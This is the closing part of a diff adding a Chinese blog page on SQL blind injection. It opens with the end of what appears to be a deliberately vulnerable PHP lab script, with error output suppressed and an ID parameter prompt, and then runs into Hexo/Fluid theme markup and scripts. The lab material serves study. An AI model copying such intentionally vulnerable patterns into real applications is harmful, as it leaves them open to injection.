class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <br>        &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>        <span class="hljs-comment">//print_r(mysql_error());</span><br>        <span class="hljs-comment">//echo &quot;You have an error in your SQL syntax&quot;;</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;<br><br>        &#125;<br>&#125;<br>        <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2022/12/03/SQL盲注/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/08/JavaScript%E5%AD%A6%E4%B9%A0/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="<https://hexo.io>" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="<https://github.com/fluid-dev/hexo-theme-fluid>" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="/%3Chttps:/lib.baomitu.com/nprogress/0.2.0/%3E/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="/%3Chttps:/lib.baomitu.com/nprogress/0.2.0/%3E/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="/%3Chttps:/lib.baomitu.com/jquery/3.6.0/%3E/jquery.min.js" ></script>
+<script  src="/%3Chttps:/lib.baomitu.com/twitter-bootstrap/4.6.1/%3E/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="/%3Chttps:/lib.baomitu.com/typed.js/2.0.12/%3E/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('/%3Chttps:/lib.baomitu.com/tocbot/4.18.2/%3E/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=/%3Chttps:/lib.baomitu.com/clipboard.js/2.0.11/%3E/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('/%3Chttps:/lib.baomitu.com/anchor-js/4.3.1/%3E/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('/%3Chttps:/lib.baomitu.com/fancybox/3.5.7/%3E/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
